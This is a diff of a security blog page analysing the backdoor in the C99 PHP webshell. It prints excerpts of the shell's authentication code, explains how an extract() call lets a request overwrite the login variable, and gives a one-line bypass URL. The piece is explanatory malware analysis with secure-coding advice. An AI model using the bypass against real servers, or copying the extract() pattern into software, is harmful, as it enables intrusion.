@@ -184,9 +184,9 @@ ga('send', 'pageview');
             <p>C99 is a PHP webshell. Attackers uploads it on web server in order to get informations and above all execute commands with web user privileges (ex: www-data).</p>
 <p>This webshell is protected by a customizable password, so interface access is limited to people who know the password.</p>
 <p>But the password verification mechanism is vulnerable ... in fact the flaw was deliberately inserted into the code to permit the webshell author to bypass it.</p>
-<h2>Code</h2>
+<h2 id="code">Code</h2>
 <p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line"></div><div class="line"><span class="comment">//Authentication</span></div><div class="line">$login = <span class="string">""</span>; <span class="comment">//login</span></div><div class="line"><span class="comment">//DON'T FORGOT ABOUT PASSWORD!!!</span></div><div class="line">$pass = <span class="string">""</span>; <span class="comment">//password</span></div><div class="line">$md5_pass = <span class="string">""</span>; <span class="comment">//md5-cryped pass. if null, md5($pass)</span></div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">@$f = $_REQUEST[<span class="string">"f"</span>];</div><div class="line">@extract($_REQUEST[<span class="string">"c999shcook"</span>]);</div><div class="line"></div><div class="line"><span class="comment">//END CONFIGURATION</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// \/Next code isn't for editing\/</span></div><div class="line">@set_time_limit(<span class="number">0</span>);</div><div class="line">$tmp = <span class="keyword">array</span>();</div><div class="line"><span class="keyword">foreach</span>($host_allow <span class="keyword">as</span> $k=&gt;$v) &#123;$tmp[] = str_replace(<span class="string">"\\*"</span>,<span class="string">".*"</span>,preg_quote($v));&#125;</div><div class="line">$s = <span class="string">"!^("</span>.implode(<span class="string">"|"</span>,$tmp).<span class="string">")$!i"</span>;</div><div class="line"><span class="keyword">if</span> (!preg_match($s,getenv(<span class="string">"REMOTE_ADDR"</span>)) <span class="keyword">and</span> !preg_match($s,gethostbyaddr(getenv(<span class="string">"REMOTE_ADDR"</span>)))) &#123;<span class="keyword">exit</span>(<span class="string">"&lt;a href=\"http://ccteam.ru/releases/cc999shell\"&gt;c999shell&lt;/a&gt;: Access Denied - your host ("</span>.getenv(<span class="string">"REMOTE_ADDR"</span>).<span class="string">") not allow"</span>);&#125;</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($login))</div><div class="line">&#123;</div><div class="line"> <span class="keyword">if</span> (<span class="keyword">empty</span>($md5_pass)) &#123;$md5_pass = md5($pass);&#125;</div><div class="line"> <span class="keyword">if</span> (($_SERVER[<span class="string">"PHP_AUTH_USER"</span>] != $login) <span class="keyword">or</span> (md5($_SERVER[<span class="string">"PHP_AUTH_PW"</span>]) != $md5_pass))</div><div class="line"> &#123;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($login_txt)) &#123;$login_txt = strip_tags(ereg_replace(<span class="string">"&amp;nbsp;|&lt;br&gt;"</span>,<span class="string">" "</span>,$donated_html));&#125;</div><div class="line">  header(<span class="string">"WWW-Authenticate: Basic realm=\"c999shell "</span>.$shver.<span class="string">": "</span>.$login_txt.<span class="string">"\""</span>);</div><div class="line">  header(<span class="string">"HTTP/1.0 401 Unauthorized"</span>);</div><div class="line">  <span class="keyword">exit</span>($accessdeniedmess);</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
-<h2>Vulnerability</h2>
+<h2 id="vulnerability">Vulnerability</h2>
 <p>Username and password are hardcoded to be easily editable.
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Authentication</span></div><div class="line">$login = <span class="string">""</span>; <span class="comment">//login</span></div><div class="line"><span class="comment">//DON'T FORGOT ABOUT PASSWORD!!!</span></div><div class="line">$pass = <span class="string">""</span>; <span class="comment">//password</span></div><div class="line">$md5_pass = <span class="string">""</span>; <span class="comment">//md5-cryped pass. if null, md5($pass)</span></div></pre></td></tr></table></figure></p>
 <p>Next, login and password are checked by the following code:
@@ -195,7 +195,7 @@ ga('send', 'pageview');
 <p>But checking is processed only if login is not empty: <code>if (!empty($login))</code>.</p>
 <p><code>$login</code> is normally initialized staticly at the begining but after that the variable can be modified by <code>extract()</code> function :
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@extract($_REQUEST[<span class="string">"c999shcook"</span>]);</div></pre></td></tr></table></figure></p>
-<h2>extract() function</h2>
+<h2 id="extract-function">extract() function</h2>
 <p>PHP documentation say :</p>
 <blockquote>
 <p>extract</p>
@@ -216,15 +216,15 @@ Import variables from an array into the current symbol table.</p>
 <p><div class="alert alert-info"><i class="fa fa-info"></i>  To develop a secure software, never use extract() with unknown data or user's data (ex: prompt).
 
 There are flags (ex: EXTR_SKIP) to protect already existing variable.</div></p>
-<h2>Exploit</h2>
+<h2 id="exploit">Exploit</h2>
 <p>Bypass authentification is very simple : overwrite <code>$login</code> variable.
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//url.com/c99.php?c999shcook[login]=0</span></div></pre></td></tr></table></figure></p>
 <p>It's possible because of:
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@extract($_REQUEST[<span class="string">"c999shcook"</span>]);</div></pre></td></tr></table></figure></p>
-<h2>Why a backdoor?</h2>
+<h2 id="why-a-backdoor">Why a backdoor?</h2>
 <p>Pirates infect websites with webshells, but because this webshell is backdoored other pirates (authors of the webshell) will be able to control the server too.</p>
 <p><code>extract()</code> function and <code>c999shcook</code> array are useless for the webshell but allow to overwrite any variables in the PHP script.</p>
-<h2>There is another flaw</h2>
+<h2 id="there-is-another-flaw">There is another flaw</h2>
 <p><div class="alert alert-warning"><i class="fa fa-bell"></i>  There is a lot of c99.php variant: c99, c999, c99shell, c99unlimited, ... so some differences may occure.
 
 There is multiple version of each variant and each variant can be declined in multiple forms: php, txt, jpg, ...</div></p>
@@ -242,7 +242,7 @@ There is multiple version of each variant and each variant can be declined in mu
 <p>Script kiddies, lamers, and inattentive pirates will use webshells without looking carefully at the code.
 The combo <em>flaw</em> + <em>inventory of infected website</em> is an easy way, for webshells' authors, to control a network of server (ex: creating a botnet) by letting to others the system corruption task.</p>
 <p>More sophisticated piracy tools have some vulnerabilities too. Malwares like Smoke Loader (SQL injection), CrimePack (SQL injection) or Zeus (remote access via upload) have been corrupted.</p>
-<h2>Warning</h2>
+<h2 id="warning">Warning</h2>
 <p>When using tools, be carefull, backdoors may be hidden. Pay attention to images, scripts, css, external request, mail functions, encoded code, ...</p>
 <p>Source: <em><a href="https://www.lexsi.com/securityhub/c99-php-meme-les-backdoors-backdoorees/" target="_blank" rel="external">C99.php : Quand même les backdoors sont backdoorées</a></em> by <strong>Hugo Ballesteros</strong></p>
 
@@ -252,7 +252,7 @@ The combo <em>flaw</em> + <em>inventory of infected website</em> is an easy way,
 
 
 
-    <a data-url="http://rawsec.ml/en/c99-php-backdoor-backdoored/" data-id="cizoihh18001zmefs21wwnliv" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+    <a data-url="http://rawsec.ml/en/c99-php-backdoor-backdoored/" data-id="cizoiwla0001volfsvxwr0dwi" class="article-share-link"><i class="fa fa-share"></i>Share</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -420,26 +420,6 @@ The combo <em>flaw</em> + <em>inventory of infected website</em> is an easy way,
                     <li>
                         
                         <div class="item-thumbnail">
-                            <a href="/en/XiomaraCTF-2017-write-ups/" class="thumbnail">
-    
-    
-        <span style="background-image:url(/images/ctf.png)" alt="Xiomara CTF 2017 - Write-ups" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
-                            <p class="item-title"><a href="/en/XiomaraCTF-2017-write-ups/" class="title">Xiomara CTF 2017 - Write-ups</a></p>
-                            <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
                             <a href="/en/NeverLAN-CTF-2017-write-ups/" class="thumbnail">
     
     
@@ -453,6 +433,26 @@ The combo <em>flaw</em> + <em>inventory of infected website</em> is an easy way,
                         <div class="item-inner">
                             <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
                             <p class="item-title"><a href="/en/NeverLAN-CTF-2017-write-ups/" class="title">NeverLAN CTF 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/XiomaraCTF-2017-write-ups/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="Xiomara CTF 2017 - Write-ups" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/XiomaraCTF-2017-write-ups/" class="title">Xiomara CTF 2017 - Write-ups</a></p>
                             <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
                         </div>
                     </li>
